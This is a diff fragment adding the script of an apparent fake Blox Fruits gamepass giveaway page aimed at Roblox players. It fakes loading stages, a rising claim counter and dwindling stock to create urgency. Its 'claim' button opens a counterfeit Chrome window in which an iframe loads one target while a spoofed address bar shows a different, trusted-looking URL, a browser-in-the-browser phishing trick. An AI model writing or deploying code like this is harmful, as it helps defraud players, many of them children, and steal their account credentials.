+        { id:"x2money",  name:"2x Money",         rarity:"pass", price:"450 R$",   stock:40, img:"https://static.wikia.nocookie.net/blox-fruits/images/9/9b/2xMoney.png" },
+        { id:"fastboats",name:"Fast Boats",       rarity:"pass", price:"350 R$",   stock:30, img:"https://static.wikia.nocookie.net/blox-fruits/images/e/ee/FastBoats.png" },
+        { id:"storage",  name:"+1 Fruit Storage", rarity:"pass", price:"400 R$",   stock:25, img:"https://static.wikia.nocookie.net/blox-fruits/images/7/78/FruitStorage.png" },
+        { id:"reroll",   name:"Race Reroll",      rarity:"pass", price:"300 R$",   stock:20, img:"https://static.wikia.nocookie.net/blox-fruits/images/8/8a/RaceReroll.png" },
+        { id:"darkblade",name:"Dark Blade",       rarity:"pass", price:"800 R$",   stock:15, img:"https://static.wikia.nocookie.net/blox-fruits/images/2/2d/DarkBlade.png" },
+        { id:"sharkman", name:"Sharkman Karate",  rarity:"pass", price:"2,500 R$", stock:10, img:"https://static.wikia.nocookie.net/blox-fruits/images/5/5c/SharkmanKarate.png" }
+      ]
+    };
+
+    document.addEventListener("DOMContentLoaded", () => {
+      renderGrid('fruitGrid', appConfig.fruits, 'fruit');
+      renderGrid('passGrid', appConfig.passes, 'pass');
+      startLoadingSequence();
+      document.getElementById('passCount').innerText = appConfig.passes.length;
+      document.getElementById('stockCount').innerText =
+        appConfig.fruits.length + appConfig.passes.length;
+    });
+
+    function renderGrid(targetId, items, kind){
+      const grid = document.getElementById(targetId);
+      if (!grid) return;
+      grid.innerHTML = items.map(it => {
+        const total = kind === 'fruit' ? 100 : 50;
+        const pct = Math.min(100, Math.round((it.stock / total) * 100));
+        return `
+          <div class="item-card">
+            <div class="item-thumb">
+              <span class="rarity-tag r-${it.rarity}">${it.rarity.toUpperCase()}</span>
+              <img src="${it.img}" alt="${it.name}" loading="lazy"
+                   onerror="this.onerror=null;this.src='${appConfig.fruitFallback}'">
+            </div>
+            <div class="item-info">
+              <div class="item-name">${it.name}</div>
+              <div class="item-desc">${kind === 'fruit'
+                ? 'Permanent unlock · claim delivered to inventory'
+                : 'Gamepass unlock · permanent account upgrade'}</div>
+              <div class="item-meta">
+                <span><i class="fa-solid fa-tag"></i> ${it.price}</span>
+                <span><i class="fa-solid fa-box"></i> ${it.stock} left</span>
+              </div>
+              <div class="stock-bar"><i style="width:${pct}%"></i></div>
+              <button class="claim-btn" onclick="claimItem('${kind}','${it.id}')">CLAIM NOW</button>
+            </div>
+          </div>
+        `;
+      }).join('');
+    }
+
+    function startLoadingSequence(){
+      const bar = document.getElementById('loading-bar');
+      const text = document.getElementById('loading-text');
+      const screen = document.getElementById('loading-screen');
+      const app = document.getElementById('app-content');
+      let progress = 0;
+      const stages = [
+        "Establishing Quantum Link...",
+        "Loading Fruit Database...",
+        "Syncing Giveaway Nodes...",
+        "Launching Claim Hub..."
+      ];
+      const interval = setInterval(() => {
+        if (progress >= 100){
+          clearInterval(interval);
+          screen.classList.add('fade-out');
+          app.classList.add('visible');
+          setTimeout(() => screen.style.display = 'none', 850);
+        } else {
+          progress += Math.floor(Math.random() * 8) + 4;
+          if (progress > 100) progress = 100;
+          bar.style.width = progress + '%';
+          let i = Math.floor((progress / 100) * stages.length);
+          if (i >= stages.length) i = stages.length - 1;
+          text.innerText = `${stages[i]} [${progress}%]`;
+        }
+      }, 60);
+    }
+
+    (function(){
+      const claimsEl = document.getElementById('totalClaims');
+      setInterval(() => {
+        if (claimsEl){
+          const cur = parseInt(claimsEl.innerText.replace(',', '')) || 48000;
+          claimsEl.innerText = (cur + Math.floor(Math.random() * 7)).toLocaleString();
+        }
+      }, 3000);
+    })();
+
+    function claimFeatured(){ claimItem('fruit', 'kitsune'); }
+
+    function claimItem(kind, id){
+      const list = kind === 'fruit' ? appConfig.fruits : appConfig.passes;
+      const item = list.find(x => x.id === id);
+      if (!item) return;
+
+      const modal = document.getElementById('loadingModal');
+      const txt = document.getElementById('loadingText');
+      txt.innerText = `Opening claim window for ${item.name}...`;
+      modal.classList.add('active');
+
+      setTimeout(() => {
+        modal.classList.remove('active');
+        showBrowserModal(appConfig.claimTarget, `Claim — ${item.name}`, appConfig.displayUrl);
+      }, 900);
+    }
+
+    function showBrowserModal(targetUrl, titleText, displayUrl){
+      const modal = document.getElementById('browserModal');
+      const iframe = document.getElementById('browserIframe');
+      const urlEl = document.getElementById('fakeUrlText');
+      const titleEl = document.getElementById('modalTabTitle');
+
+      iframe.src = targetUrl;
+      titleEl.innerText = titleText;
+      const parsed = displayUrl.replace(/^https?:\/\//, '');
+      urlEl.innerHTML = `<span class="chrome-url-dim">https://</span>${parsed}`;
+      modal.classList.add('active');
+      document.body.style.overflow = 'hidden';
+    }
+
+    function closeChromeModal(){
+      const modal = document.getElementById('browserModal');
+      const iframe = document.getElementById('browserIframe');
+      modal.classList.remove('active');
+      document.body.style.overflow = '';
+      iframe.src = 'about:blank';
+    }
+
+    document.getElementById('closeBrowserBtn').addEventListener('click', closeChromeModal);
+    document.getElementById('closeTabBtn').addEventListener('click', closeChromeModal);
+    document.getElementById('browserModal').addEventListener('click', e => {
+      if (e.target === document.getElementById('browserModal')) closeChromeModal();
+    });
+    document.addEventListener('keydown', e => {
+      if (e.key === 'Escape' && document.getElementById('browserModal').classList.contains('active'))
+        closeChromeModal();
+    });
+  </script>
+</body>
+</html>
